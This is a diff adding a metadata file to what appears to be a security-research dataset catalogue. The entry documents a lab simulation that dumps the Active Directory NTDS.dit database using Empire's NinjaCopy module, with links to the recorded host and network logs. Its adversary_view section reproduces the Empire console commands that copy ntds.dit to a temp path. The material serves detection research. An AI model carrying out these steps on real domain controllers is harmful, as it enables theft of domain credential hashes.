@@ -1,0 +1,90 @@
+title: Dumping NTDS.dit using NinjaCopy
+id: SDWIN-230720004300
+contributors:
+- Jose Rodriguez @Cyb3rPandaH
+creation_date: 2023/07/20
+modification_date: 2023/07/20
+platform:
+- Windows
+type: atomic
+tags:
+- ntds
+- NinjaCopy
+- empire
+description: Active Directory database NTDS.dit is dumped by using Empire's NinjaCopy module.
+attack_mappings:
+  - technique: T1003
+    sub-technique: "003"
+    tactics:
+      - TA0006
+notebooks:
+files:
+- type: Host
+  link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_ninjacopy_dumping_ntds_dit_file.zip
+- type: Network
+  link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/network/empire_ninjacopy_dumping_ntds_dit_file_pcap.zip
+simulation:
+  environment: Lab VM
+  tools:
+    - type: Manual
+      name: Empire
+      module: powershell/collection/ninjacopy
+      script: https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Invoke-NinjaCopy.ps1
+  permissions_required:
+    - Administrator
+  adversary_view: |-
+    [+] New agent FED9MCS4 checked in
+    [*] Sending agent (stage 2) to FED9MCS4 at 192.168.56.50
+    (Empire) > interact FED9MCS4
+    (Empire: FED9MCS4) > usemodule powershell/collection/ninjacopy
+    [*] Set Agent to FED9MCS4
+
+    Author       @JosephBialek                                                          
+    Background   True                                                                   
+    Comments     https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration 
+                  /Invoke-NinjaCopy.ps1                                                  
+                  https://clymb3r.wordpress.com/2013/06/13/using-powershell-to-copy-     
+                  ntds-dit-registry-hives-bypass-sacls-dacls-file-locks/                 
+    Description  Copies a file from an NTFS partitioned volume by reading the raw       
+                  volume and parsing the NTFS structures.                                
+    Language     powershell                                                             
+    Name         powershell/collection/ninjacopy                                        
+    NeedsAdmin   True                                                                   
+    OpsecSafe    False                                                                  
+    Techniques   http://attack.mitre.org/techniques/T1105                               
+
+
+    ┌Record Options─────┬──────────┬──────────┬─────────────────────────────────────┐
+    │ Name              │ Value    │ Required │ Description                         │
+    ├───────────────────┼──────────┼──────────┼─────────────────────────────────────┤
+    │ Agent             │ FED9MCS4 │ True     │ Agent to run module on.             │
+    ├───────────────────┼──────────┼──────────┼─────────────────────────────────────┤
+    │ ComputerName      │          │ False    │ An array of computernames to run    │
+    │                   │          │          │ the script on.                      │
+    ├───────────────────┼──────────┼──────────┼─────────────────────────────────────┤
+    │ LocalDestination  │          │ False    │ A file path to copy the file to on  │
+    │                   │          │          │ the local computer.                 │
+    ├───────────────────┼──────────┼──────────┼─────────────────────────────────────┤
+    │ Path              │          │ True     │ The full path of the file to copy   │
+    │                   │          │          │ (example: c:\windows\ntds\ntds.dit) │
+    ├───────────────────┼──────────┼──────────┼─────────────────────────────────────┤
+    │ RemoteDestination │          │ False    │ A file path to copy the file to on  │
+    │                   │          │          │ the remote computer. If this isn't  │
+    │                   │          │          │ used, LocalDestination must be      │
+    │                   │          │          │ specified.                          │
+    └───────────────────┴──────────┴──────────┴─────────────────────────────────────┘
+
+    (Empire: usemodule/powershell/collection/ninjacopy) > set Path C:\\Windows\\NTDS\\ntds.dit
+    [*] Set Path to C:\Windows\NTDS\ntds.dit
+    (Empire: usemodule/powershell/collection/ninjacopy) > set RemoteDestination C:\\Windows\\Temp\\ntds-copy.dit
+    [*] Set RemoteDestination to C:\Windows\Temp\ntds-copy.dit
+    (Empire: usemodule/powershell/collection/ninjacopy) > execute
+    [*] Tasked FED9MCS4 to run Task 1
+    [*] Task 1 results received
+    Job started: P72LDN
+    [*] Task 1 results received
+    Invoke-NinjaCopy Completed
+
+    (Empire: FED9MCS4) >
+references:
+- https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Invoke-NinjaCopy.ps1
